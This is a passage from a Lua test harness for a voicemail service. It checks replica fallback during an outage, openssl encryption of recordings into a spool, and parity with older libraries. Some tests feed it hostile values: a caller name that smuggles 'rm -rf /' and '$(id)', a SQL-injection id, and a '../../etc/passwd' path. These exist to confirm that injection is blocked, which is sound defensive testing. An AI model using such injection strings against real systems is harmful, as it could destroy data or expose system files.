        local ok = h:sub(1, 4) == "RIFF" and h:sub(9, 12) == "WAVE" and h:sub(13, 16) == "fmt "
            and h:byte(21) == 1 and h:byte(23) == 1 and (h:byte(25) + h:byte(26) * 256) == 8000 and h:byte(35) == 16
        check("[13] prompt " .. p .. ".wav is 8 kHz mono PCM16", ok, "bad header")
    end
end

-- ==================================================================
-- [14] East outage resilience (Visual IVR plan D11 / §7.5, contract §8.4):
--      zone-replica mailbox check + seal-to-spool instead of "lost"
-- ==================================================================
do
    print("[14] East outage: replica fallback, seal to spool, plaintext unlinked")
    local OAEP = "-keyopt rsa_padding_mode:oaep -keyopt rsa_oaep_md:sha256 -keyopt rsa_mgf1_md:sha256"
    local function expected_seal_cmd(u, n)
        local r = {}
        for k = 1, n do r[#r + 1] = "-recip '/dev/shm/vm/r" .. k .. "_" .. u .. ".pem' " .. OAEP end
        local sp = "/var/lib/crag/vm-spool/" .. u
        return "{ umask 077 && timeout 30 openssl cms -encrypt -binary -aes-256-gcm -keyid -outform DER"
            .. " -in '/dev/shm/vm/s_" .. u .. ".bin' -out '" .. sp .. ".cms.tmp' " .. table.concat(r, " ")
            .. " && install -m 0600 '/dev/shm/vm/j_" .. u .. ".json' '" .. sp .. ".json.tmp'"
            .. " && sync '" .. sp .. ".cms.tmp' '" .. sp .. ".json.tmp' && echo SEALED_OK; } 2>&1"
    end
    local REPLICA_SQL = "SELECT mailbox_id, did, customer_id, status, accepting, max_message_seconds, reason"
        .. " FROM vm_fs_mailbox WHERE mailbox_id = 42 LIMIT 1"
    local REPLICA_OK = { row = { mailbox_id = "42", did = MAILBOX_DID, customer_id = "77", status = "active",
        accepting = "t", max_message_seconds = "120", reason = nil } }
    local API_DOWN = { code = "000", exit = 28 }          -- connect timeout (black-holed East)
    local DEPOSITS_DOWN = { { code = "000", exit = 7 }, { code = "000", exit = 7 }, { code = "503" } }
    local function spool_names(c)
        local cms, json_, other = {}, {}, {}
        for _, n in ipairs(c.spool_after) do
            if n:match("^" .. UUID4 .. "%.cms$") then cms[#cms + 1] = n
            elseif n:match("^" .. UUID4 .. "%.json$") then json_[#json_ + 1] = n
            else other[#other + 1] = n end
        end
        return cms, json_, other
    end
    local function read_spool(c, name)
        local f = real_io.open(c.dir .. "/spool/" .. name, "rb")
        local s = f and f:read("*a")
        if f then f:close() end
        return s
    end

    -- [14a] API up: nothing new happens (replica, spool and certificates
    --       all present but untouched; the call is the [1] call).
    local c = run_scenario(direct({ spool = true, replica = REPLICA_OK,
        caller_name = "Jane Caller",
        mailbox = { code = "200", body = '{"mailbox_id":42,"customer_id":77,"did":"+15550009999","status":"active","accepting":true,"reason":null,"max_message_seconds":120,"greeting":null}' } }))
    check("[14a] API up: exactly the 2 API commands (no openssl, no du/df)", #c.popen == 2
        and c.popen[1] == expected_mailbox_cmd(42) and c.popen[2]:find("/v1/voicemail/fs/deposit'", 1, true)
        and c.seal_cmds == nil and c.usage_cmd == nil, #c.popen)
    check("[14a] API up: replica never connected", find_event(c, "replica:") == nil and c.replica_sql == nil,
        tostring(c.replica_sql))
    check("[14a] API up: vm_lookup_source unset, stored, spool empty",
        c.setvars.vm_lookup_source == nil and c.setvars.vm_result == "stored" and #c.spool_after == 0,
        tostring(c.setvars.vm_lookup_source) .. " " .. tostring(c.setvars.vm_result))
    check("[14a] API up: same sweep exec as [1]", #c.execs == 1 and c.execs[1] == SWEEP_CMD, c.execs[1])
    assert_clean("[14a]", c)

    -- [14b] East down end to end: replica answers, message recorded with
    --       the replica's limit + default greeting, deposit fails 3x,
    --       sealed to the spool, plaintext unlinked.
    c = run_scenario(direct({ spool = true, replica = REPLICA_OK, mailbox = API_DOWN,
        deposits = DEPOSITS_DOWN, caller_id = "+15085550123", sip_from_user = "+15085550123",
        caller_name = "Jane Caller", record = { secs = 7 } }))
    local rp = rec_path_of(c)
    local u = rp and rp:match("^/dev/shm/vm/(" .. UUID4 .. ")%.wav$")
    check("[14b] replica queried with the exact SQL, connection closed",
        c.replica_sql == REPLICA_SQL and c.replica_closed == true, c.replica_sql)
    check("[14b] vm_lookup_source=replica", c.setvars.vm_lookup_source == "replica", c.setvars.vm_lookup_source)
    check("[14b] record uses the replica's max_message_seconds (120)", rp and c.records[1] == rp .. " 120 200 10",
        c.records[1])
    check("[14b] default greeting (custom greetings need the East API)",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/default_greeting.wav"
        and c.setvars.vm_greeting == "default" and #popen_kind(c, "/fs/greetings/") == 0, c.playbacks[1])
    check("[14b] replica consulted AFTER the API lookup failed, BEFORE the greeting",
        (find_event(c, "popen:mailbox") or 99) < (find_event(c, "replica:connect") or 0)
        and (find_event(c, "replica:close") or 99) < (find_event(c, "playback:") or 0), "order")
    check("[14b] 3 deposit attempts, then the seal", #popen_kind(c, "/fs/deposit") == 3 and c.seal_cmds == 1
        and (find_event(c, "popen:seal") or 0) > (find_event(c, "msleep:2000") or 99), tostring(c.seal_cmds))
    check("[14b] spool usage measured with the constant command",
        c.usage_cmd == "du -sk '/var/lib/crag/vm-spool' 2>/dev/null; df -Pk '/var/lib/crag/vm-spool' 2>/dev/null",
        c.usage_cmd)
    check("[14b] openssl command is exact (1 recipient, AES-256-GCM, OAEP-SHA256, -keyid, DER)",
        u and popen_kind(c, "openssl cms")[1] == expected_seal_cmd(u, 1), popen_kind(c, "openssl cms")[1])
    check("[14b] the recipient certificate was in tmpfs at seal time", c.recips_at_seal == 1, c.recips_at_seal)
    local fr = c.sealed_frame or ""
    local mlen, rest = fr:match("^CRAGVMS1\n(%d+)\n(.*)$")
    local mjson = rest and rest:sub(1, tonumber(mlen))
    local wav = rest and rest:sub(tonumber(mlen) + 1)
    local m = mjson and json.decode(mjson)
    check("[14b] sealed frame = CRAGVMS1 \\n len \\n META WAV", m ~= nil and wav == wav_bytes(7), #fr)
    check("[14b] META fields are exactly contract §8.4 + v", m and m.v == 1 and m.msg_uuid == u
        and m.mailbox_id == 42 and m.did == MAILBOX_DID and m.caller_number == "+15085550123"
        and m.caller_name == "Jane Caller" and m.duration_ms == 7000 and m.zone == "east"
        and type(m.received_at) == "string" and m.received_at:match("^%d%d%d%d%-%d%d%-%d%dT%d%d:%d%d:%d%dZ$"),
        mjson)
    local nkeys = 0
    for _ in pairs(m or {}) do nkeys = nkeys + 1 end
    check("[14b] META carries no other key (no call_uuid / fs_node / caller_id_*)", nkeys == 9, nkeys)
    local cms, jsn, other = spool_names(c)
    check("[14b] spool = exactly <uuid>.cms + <uuid>.json (no .tmp left)",
        #cms == 1 and #jsn == 1 and #other == 0 and cms[1] == u .. ".cms" and jsn[1] == u .. ".json",
        table.concat(c.spool_after, ","))
    check("[14b] sidecar == the sealed META bytes", read_spool(c, u .. ".json") == mjson, read_spool(c, u .. ".json"))
    local blob = read_spool(c, u .. ".cms") or ""
    check("[14b] no RIFF/WAVE bytes anywhere in the spool",
        not blob:find("RIFF", 1, true) and not blob:find("WAVE", 1, true)
        and not (read_spool(c, u .. ".json") or ""):find("RIFF", 1, true), "plaintext in spool")
    check("[14b] renames: .json first, .cms last",
        (find_event(c, "rename:/var/lib/crag/vm-spool/" .. tostring(u) .. ".json.tmp") or 99)
        < (find_event(c, "rename:/var/lib/crag/vm-spool/" .. tostring(u) .. ".cms.tmp") or 0), "order")
    check("[14b] recording unlinked right after the seal (before cleanup)",
        (find_event(c, "remove:" .. tostring(rp)) or 0) > (find_event(c, "rename:/var/lib/crag/vm-spool/" .. tostring(u) .. ".cms.tmp") or 99),
        "order")
    check("[14b] vm_result=spooled, SEALED logged", c.setvars.vm_result == "spooled"
        and has_log(c, "WARNING", "SEALED to the spool"), c.setvars.vm_result)
    check("[14b] directory fsync after the renames", c.execs[1] == "sync '/var/lib/crag/vm-spool' >/dev/null 2>&1",
        c.execs[1])
    check("[14b] mailbox GET uses the 1 s connect timeout", popen_kind(c, "/fs/mailbox/")[1] == expected_mailbox_cmd(42),
        popen_kind(c, "/fs/mailbox/")[1])
    assert_clean("[14b]", c)

    -- [14c] API lookup fine, East goes away before the deposit: sealed.
    c = run_scenario(direct({ spool = true, deposits = DEPOSITS_DOWN }))
    check("[14c] API answered the lookup (no replica), deposit failed -> spooled",
        c.replica_sql == nil and c.setvars.vm_lookup_source == nil and c.setvars.vm_result == "spooled"
        and #c.spool_after == 2, c.setvars.vm_result)
    assert_clean("[14c]", c)

    -- [14d] Replica outcomes.
    c = run_scenario(direct({ spool = true, mailbox = API_DOWN, replica = { row = {
        mailbox_id = "42", did = MAILBOX_DID, customer_id = "77", status = "active", accepting = "f",
        max_message_seconds = "300", reason = "full" } } }))
    check("[14d] replica full -> mailbox_full.wav, hang up, nothing recorded",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/mailbox_full.wav" and #c.records == 0
        and c.setvars.vm_result == "not_accepting_full" and #popen_kind(c, "/fs/deposit") == 0, c.playbacks[1])
    assert_clean("[14d full]", c)
    c = run_scenario(direct({ spool = true, mailbox = API_DOWN, replica = { row = {
        mailbox_id = "42", did = MAILBOX_DID, customer_id = "77", status = "suspended", accepting = "f",
        max_message_seconds = "300", reason = "inactive" } } }))
    check("[14d] replica inactive -> unavailable.wav", c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav"
        and c.setvars.vm_result == "not_accepting_inactive" and #c.records == 0, c.playbacks[1])
    assert_clean("[14d inactive]", c)
    c = run_scenario(direct({ spool = true, mailbox = API_DOWN, replica = { none = true } }))
    check("[14d] replica: no row (deleted mailbox) -> unavailable, unavailable_404",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav"
        and c.setvars.vm_result == "unavailable_404" and #c.records == 0
        and c.setvars.vm_lookup_source == "replica", c.setvars.vm_result)
    assert_clean("[14d none]", c)
    local unusable = {
        { tag = "view missing (58 not applied)", r = { error = 'ERROR: relation "vm_fs_mailbox" does not exist' } },
        { tag = "no connection", r = { noconn = true } },
        { tag = "accepting not a boolean", r = { row = { mailbox_id = "42", accepting = "maybe", max_message_seconds = "60" } } },
        { tag = "row for another mailbox", r = { row = { mailbox_id = "43", accepting = "t", max_message_seconds = "60" } } },
        { tag = "not accepting without reason", r = { row = { mailbox_id = "42", accepting = "f", max_message_seconds = "60" } } },
    }
    for _, k in ipairs(unusable) do
        c = run_scenario(direct({ spool = true, mailbox = API_DOWN, replica = k.r }))
        local rp2 = rec_path_of(c)
        check("[14d] replica " .. k.tag .. " -> today's defaults (300 s, default greeting), vm_lookup_source=defaults",
            rp2 and c.records[1] == rp2 .. " 300 200 10" and c.setvars.vm_lookup_source == "defaults"
            and c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/default_greeting.wav"
            and c.setvars.vm_result == "stored", tostring(c.records[1]) .. " " .. tostring(c.setvars.vm_lookup_source))
        assert_clean("[14d " .. k.tag .. "]", c)
    end
    c = run_scenario(direct({ mailbox = API_DOWN }))   -- db_client without get_connection
    check("[14d] replica unusable (no get_connection) -> defaults, as before 58",
        c.records[1] and c.records[1]:match(" 300 200 10$") and c.setvars.vm_lookup_source == "defaults", c.records[1])
    assert_clean("[14d no get_connection]", c)
    c = run_scenario(direct({ spool = true, mailbox = API_DOWN, replica = { row = {
        mailbox_id = "42", accepting = "t", max_message_seconds = "99999" } } }))
    check("[14d] replica max_message_seconds out of range -> 300", c.records[1] and c.records[1]:match(" 300 200 10$"),
        c.records[1])
    assert_clean("[14d bad max]", c)

    -- [14e] Two recipients (rotation): two -recip groups, both certs in tmpfs.
    c = run_scenario(direct({ spool = true, recipients = TWO_CERTS, deposits = DEPOSITS_DOWN }))
    local u2 = (rec_path_of(c) or ""):match("(" .. UUID4 .. ")%.wav$")
    check("[14e] 2 recipients -> exact 2-recipient openssl command",
        u2 and popen_kind(c, "openssl cms")[1] == expected_seal_cmd(u2, 2) and c.recips_at_seal == 2,
        popen_kind(c, "openssl cms")[1])
    check("[14e] spooled", c.setvars.vm_result == "spooled", c.setvars.vm_result)
    assert_clean("[14e]", c)

    -- [14f] Hostile caller data never reaches the openssl command line.
    local evil = "'; rm -rf / #$(id)`x`"
    c = run_scenario(direct({ spool = true, deposits = DEPOSITS_DOWN, caller_name = evil,
        caller_id = "+1508'$(id)", sip_from_user = "+1508'$(id)" }))
    local scmd = popen_kind(c, "openssl cms")[1] or ""
    check("[14f] hostile caller name/number absent from the seal command",
        scmd ~= "" and not scmd:find("rm -rf", 1, true) and not scmd:find("$(id)", 1, true), scmd)
    check("[14f] ...and present (escaped JSON) only inside the sealed META", (c.sealed_frame or ""):find("rm -rf", 1, true) ~= nil,
        "missing")
    assert_clean("[14f]", c)

    -- [14g] Seal impossible -> "lost" exactly as before (logged), nothing
    --       left in the spool, tmpfs clean.
    local PRIVATE = ONE_CERT .. "-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n"
    local FIVE = ONE_CERT .. ONE_CERT .. ONE_CERT .. ONE_CERT .. ONE_CERT
    local cannot = {
        { tag = "spool not mounted", sc = { deposits = DEPOSITS_DOWN }, log = "not mounted" },
        { tag = "recipients file missing", sc = { spool = true, recipients = false, deposits = DEPOSITS_DOWN }, log = "missing or unreadable" },
        { tag = "recipients file holds a private key", sc = { spool = true, recipients = PRIVATE, deposits = DEPOSITS_DOWN }, log = "PRIVATE KEY" },
        { tag = "more than 4 certificates", sc = { spool = true, recipients = FIVE, deposits = DEPOSITS_DOWN }, log = "more than 4" },
        { tag = "no certificate block", sc = { spool = true, recipients = "hello\n", deposits = DEPOSITS_DOWN }, log = "no certificate" },
        { tag = "openssl fails", sc = { spool = true, openssl = "fail", deposits = DEPOSITS_DOWN }, log = "openssl seal failed" },
        { tag = "openssl output is not CMS", sc = { spool = true, openssl = "garbage", deposits = DEPOSITS_DOWN }, log = "not a CMS AuthEnvelopedData" },
        { tag = "spool over the safety ceiling", sc = { spool = true, deposits = DEPOSITS_DOWN,
            usage = "5000000\t/var/lib/crag/vm-spool\nFilesystem 1024-blocks Used Available Capacity Mounted on\n/dev/sda1 10255636 4102340 5612448 43% /x\n" },
            log = "safety ceiling" },
        { tag = "disk almost full", sc = { spool = true, deposits = DEPOSITS_DOWN,
            usage = "10\t/var/lib/crag/vm-spool\nFilesystem 1024-blocks Used Available Capacity Mounted on\n/dev/sda1 10255636 10000000 500 99% /x\n" },
            log = "free on the spool filesystem" },
    }
    for _, k in ipairs(cannot) do
        c = run_scenario(direct(k.sc))
        check("[14g] " .. k.tag .. " -> lost + ERROR, spool empty",
            c.setvars.vm_result == "lost" and has_log(c, "ERR", "message lost")
            and #c.spool_after == 0, tostring(c.setvars.vm_result) .. " spool=" .. table.concat(c.spool_after, ","))
        check("[14g] " .. k.tag .. " -> reason logged", has_log(c, "ERR", k.log), k.log)
        assert_clean("[14g " .. k.tag .. "]", c)
    end
    c = run_scenario(direct({ spool = true, deposits = DEPOSITS_DOWN, usage = "garbage" }))
    check("[14g] du/df unparsable -> sealed anyway (WARNING), spooled",
        c.setvars.vm_result == "spooled" and has_log(c, "WARNING", "could not measure"), c.setvars.vm_result)
    assert_clean("[14g du unparsable]", c)

    -- [14h] Permanent rejection is NOT sealed (the API decided).
    for _, code in ipairs({ "404", "409", "422" }) do
        c = run_scenario(direct({ spool = true, deposits = { { code = code } } }))
        check("[14h] deposit " .. code .. " -> rejected, never sealed",
            c.setvars.vm_result == "rejected_" .. code and c.seal_cmds == nil and #c.spool_after == 0,
            c.setvars.vm_result)
        assert_clean("[14h " .. code .. "]", c)
    end

    -- [14i] Units.
    local spool = plain_load("vm_spool")
    local replica = plain_load("vm_replica")
    check("[14i] vm_replica.query exact + integer-only",
        replica.query(42) == REPLICA_SQL and replica.query("42; DROP") == nil and replica.query(0) == nil
        and replica.query(2147483648) == nil and replica.query(4.5) == nil, replica.query(42))
    check("[14i] vm_replica.fetch_mailbox(bad id) -> error, no db touched",
        replica.fetch_mailbox("x", { db = {} }).kind == "error", "kind")
    check("[14i] vm_spool.paths rejects a non-UUIDv4", spool.paths("/dev/shm/vm", "../../etc/passwd") == nil
        and spool.paths("/dev/shm/vm", "00000000-0000-1000-8000-000000000000") == nil, "accepted")
    check("[14i] vm_spool.seal_cmd refuses 0 / 5 / fractional recipients",
        spool.seal_cmd(spool.paths("/dev/shm/vm", "3f2c8a8e-1b7d-4c3e-9a1f-2b3c4d5e6f70"), 0) == nil
        and spool.seal_cmd(spool.paths("/dev/shm/vm", "3f2c8a8e-1b7d-4c3e-9a1f-2b3c4d5e6f70"), 5) == nil
        and spool.seal_cmd(spool.paths("/dev/shm/vm", "3f2c8a8e-1b7d-4c3e-9a1f-2b3c4d5e6f70"), 1.5) == nil, "built")
    local used, free = spool.parse_usage(USAGE_OK)
    check("[14i] parse_usage(du+df)", used == 12 and free == 5612448, tostring(used) .. "/" .. tostring(free))
    local u3, f3 = spool.parse_usage("")
    check("[14i] parse_usage(empty) -> nil, nil", u3 == nil and f3 == nil, tostring(u3))
    check("[14i] seal() never raises on garbage input",
        spool.seal({ msg_uuid = "nope", vm_dir = "/dev/shm/vm" }).ok == false
        and spool.seal({}).ok == false, "raised")
end


-- ==================================================================
-- [15] API up => byte-identical to the pre-D11 libraries (optional:
--      BASELINE_LIBDIR=<dir with the old vm_box.lua + vm_deposit.lua>)
-- ==================================================================
do
    local BASE = real_os.getenv("BASELINE_LIBDIR")
    if not BASE or BASE == "" then
        print("[15] SKIP (set BASELINE_LIBDIR to compare against the pre-change libraries)")
    else
        if BASE:sub(-1) ~= "/" then BASE = BASE .. "/" end
        print("[15] API up: byte-identical to " .. BASE)
        local OK_MB = '{"mailbox_id":42,"customer_id":77,"did":"+15550009999","status":"active","accepting":true,"reason":null,"max_message_seconds":120,"greeting":null}'
        local GREET = '{"mailbox_id":42,"accepting":true,"reason":null,"max_message_seconds":300,"greeting":{"greeting_id":5,"duration_ms":2000}}'
        local factories = {
            { "direct happy path", function() return direct({ caller_name = "Jane Caller", mailbox = { code = "200", body = OK_MB } }) end },
            { "on-net RCF -> mailbox", function() return {
                inbound_did = "+16170000001", caller_id = "+15085550777", sip_from_user = "+15085550777", caller_name = "Bob",
                step1 = { product_type = "rcf", customer_id = 10, forward_to = MAILBOX_DID, pass_caller_id = true, rcf_name = "Origin" },
                oracle = { [MAILBOX_DID] = VM_ORACLE_ROW } } end },
            { "custom greeting", function() return direct({ mailbox = { code = "200", body = GREET }, greeting = { code = "200", content = wav_bytes(2) } }) end },
            { "greeting fetch 503", function() return direct({ mailbox = { code = "200", body = GREET }, greeting = { code = "503" } }) end },
            { "mailbox full", function() return direct({ mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":false,"reason":"full"}' } }) end },
            { "mailbox inactive", function() return direct({ mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":false,"reason":"inactive"}' } }) end },
            { "lookup 404", function() return direct({ mailbox = { code = "404", body = '{"detail":"x"}' } }) end },
            { "lookup 401", function() return direct({ mailbox = { code = "401", body = '{"detail":"x"}' } }) end },
            { "deposit 409", function() return direct({ deposits = { { code = "409" } } }) end },
            { "deposit 422", function() return direct({ deposits = { { code = "422" } } }) end },
            { "deposit 503 then stored", function() return direct({ deposits = { { code = "503" }, { code = "200", body = '{"status":"stored","message_id":5}' } } }) end },
            { "hangup mid-record", function() return direct({ record = { secs = 20, hangup = true } }) end },
            { "too short", function() return direct({ record = { secs = 0.6, hangup = true } }) end },
            { "hangup in greeting", function() return direct({ hangup_during_greeting = true }) end },
            { "prompts missing", function() return direct({ sounds = "missing" }) end },
            { "preflight: header missing", function() return direct({ header = false }) end },
            { "with spool + replica present", function() return direct({ spool = true, replica = { row = { mailbox_id = "42", accepting = "t", max_message_seconds = "60" } } }) end },
        }
        local function norm(s)
            -- X-VM-Meta embeds the random msg_uuid: compare its decoded JSON
            s = tostring(s):gsub("X%-VM%-Meta: ([A-Za-z0-9_%-]+)", function(b)
                return "X-VM-Meta: " .. (dep.b64url_decode(b) or b)
            end)
            s = s:gsub(UUID4, "<uuid>")
            -- the one intended difference: the mailbox GET connect timeout 2 -> 1
            s = s:gsub("%-%-connect%-timeout 2 %-%-max%-time 3 ", "--connect-timeout 1 --max-time 3 ")
            return s
        end
        local function flat(c)
            local out = {}
            local function add(k, v) out[#out + 1] = k .. "=" .. norm(v) end
            for _, x in ipairs(c.popen) do add("popen", x) end
            for _, x in ipairs(c.execs) do add("exec", x) end
            for _, x in ipairs(c.playbacks) do add("play", x) end
            for _, x in ipairs(c.records) do add("record", x) end
            for _, x in ipairs(c.hangups) do add("hangup", x) end
            for _, x in ipairs(c.events) do add("event", x) end
            for _, x in ipairs(c.msleeps) do add("msleep", x) end
            for _, l in ipairs(c.logs) do add("log", l.level .. " " .. l.msg) end
            local keys = {}
            for k in pairs(c.setvars) do keys[#keys + 1] = k end
            table.sort(keys)
            for _, k in ipairs(keys) do add("var " .. k, c.setvars[k]) end
            add("vm_dir_after", #c.vm_dir_after)
            add("deposit_bytes", c.deposit_bytes and #c.deposit_bytes or 0)
            return out
        end
        for _, f in ipairs(factories) do
            local old_sc = f[2]()
            old_sc.libdir = BASE
            local a, b = flat(run_scenario(old_sc)), flat(run_scenario(f[2]()))
            local same, where = (#a == #b), nil
            for i = 1, math.max(#a, #b) do
                if a[i] ~= b[i] then same = false; where = i; break end
            end
            check("[15] " .. f[1] .. ": identical (" .. #b .. " observations)", same,
                where and ("first diff #" .. where .. "\n      old: " .. tostring(a[where]) .. "\n      new: " .. tostring(b[where])) or "length")
        end
    end
end

real_os.execute("rm -rf '" .. SCRATCH .. "'")
print(string.format("\n%d passed, %d failed", passes, failures))
if failures > 0 then
    print("VOICEMAIL HARNESS: FAILURES")
    os.exit(1)
end
print("ALL VOICEMAIL HARNESS ASSERTIONS PASSED")
